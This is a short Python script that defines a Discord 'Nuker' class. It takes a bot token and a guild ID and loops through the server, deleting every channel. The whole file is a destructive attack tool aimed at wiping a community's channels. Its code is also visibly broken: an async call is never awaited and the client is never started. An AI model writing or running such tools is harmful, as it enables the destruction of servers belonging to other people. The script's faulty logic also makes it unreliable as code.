from tokenize import TokenInfo, tokenize
import discord
import asyncio

intents = discord.Intents.default()
client = discord.Client(intents=intents)
intents.guilds = True
class Nuker:
    def __init__(self, token: str):
        self.token = token

    async def full(self):
        guild_id = int(input("Enter Guild ID"))
        guild = await client.fetch_guild(guild_id)
        for channel in guild.channels:
            await channel.delete()
            print(f"{channel.name} Has Been Seleted")

    def tkenrun(self):
        client.run(self.token)
        
    def run_all(self):
        @client.event
        async def on_ready():
            print("Logged in Successfully...")
            self.full()

if __name__ == '__main__':
    token = input("Enter TOKEN >> ")
    nk = Nuker(token)
    nk.run_all()
